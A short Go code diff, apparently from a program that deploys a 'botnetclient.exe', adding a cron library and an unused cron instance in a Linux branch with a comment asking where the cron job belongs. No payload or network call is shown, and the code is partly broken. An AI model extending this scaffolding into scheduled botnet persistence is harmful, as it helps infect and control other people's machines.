@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"github.com/jung-kurt/gofpdf"
+	"github.com/robfig/cron/v3"
 	"io"
 	"log"
 	"net/http"
@@ -93,6 +94,8 @@ func main() {
 	case "linux":
 		// cron job probably isn't done here, but where?
 		clientName = filepath.Join(here, "\\botnetclient.exe")
+
+		cron := cron.New()
 	case "default":
 		fmt.Println("OS will not be supported")
 		os.Exit(1)
